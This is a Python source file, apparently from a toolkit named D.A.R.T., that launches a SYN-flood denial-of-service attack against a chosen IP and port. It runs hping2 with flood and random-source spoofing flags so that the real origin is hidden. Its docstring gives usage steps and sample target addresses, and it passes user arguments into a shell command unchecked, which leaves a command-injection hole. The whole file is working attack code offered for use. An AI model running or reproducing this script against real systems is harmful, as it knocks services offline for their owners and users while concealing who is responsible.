"""
DDoS (SYN Flood) Attack Script for D.A.R.T.

Sends a SYN flood to a target IP using hping2, overwhelming it with spoofed
TCP SYN packets. Packets use a random source IP on each send so replies go
nowhere and the real origin is hidden.

Requires monitor mode to already be running via MonitorModeManager.py.
Uses the interface defined in config.py.

Usage:
    1. Start monitor mode:  sudo python MonitorModeManager.py
    2. Find your target:    sudo python MonitorBssidFind.py
    3. Run DDoS attack:     sudo python DdosCommand.py <packets> <port> <target_ip>

Examples:
    sudo python DdosCommand.py 1500 8866 172.19.10.1
    sudo python DdosCommand.py 5000 80 192.168.1.1

hping2 flags used:
    -c <count>      Number of packets to send
    -d 120          Pad each packet to 120 bytes
    -S              Set the SYN flag (initiate TCP handshake)
    -w 64           Set TCP window size to 64
    -p <port>       Target port number
    --flood         Send packets as fast as possible, suppress reply info
    --rand-source   Spoof a random source IP on every packet
"""

import argparse
import os
import sys
import subprocess

from config import MON_INTERFACE, MM_LOCK_FILE


def check_monitor_mode():
    """Verify that monitor mode is active by checking for the lock file."""
    if not os.path.exists(MM_LOCK_FILE):
        print("[!] Monitor mode is not active.")
        print("    Start it first:  sudo python MonitorModeManager.py")
        sys.exit(1)
    print(f"[+] Monitor mode confirmed active on {MON_INTERFACE}")


def main():
    parser = argparse.ArgumentParser(
        description="Send a SYN flood to a target IP using hping2."
    )

    parser.add_argument("packets",
        help="Number of packets to send (e.g., 1500)")

    parser.add_argument("port",
        help="Target port number (e.g., 8866)")

    parser.add_argument("target_ip",
        help="Target IP address (e.g., 172.19.10.1)")

    args = parser.parse_args()

    check_monitor_mode()

    print(f"[*] Starting SYN flood attack")
    print(f"    Target:     {args.target_ip}:{args.port}")
    print(f"    Packets:    {args.packets}")
    print(f"    Interface:  {MON_INTERFACE}")
    print()

    # hping2 is interactive — run without suppressing output
    subprocess.run(
        f"sudo hping2 -c {args.packets} -d 120 -S -w 64 -p {args.port} --flood --rand-source {args.target_ip}",
        shell=True,
        check=False
    )


if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("Error: This script must be run as sudo.")
    main()
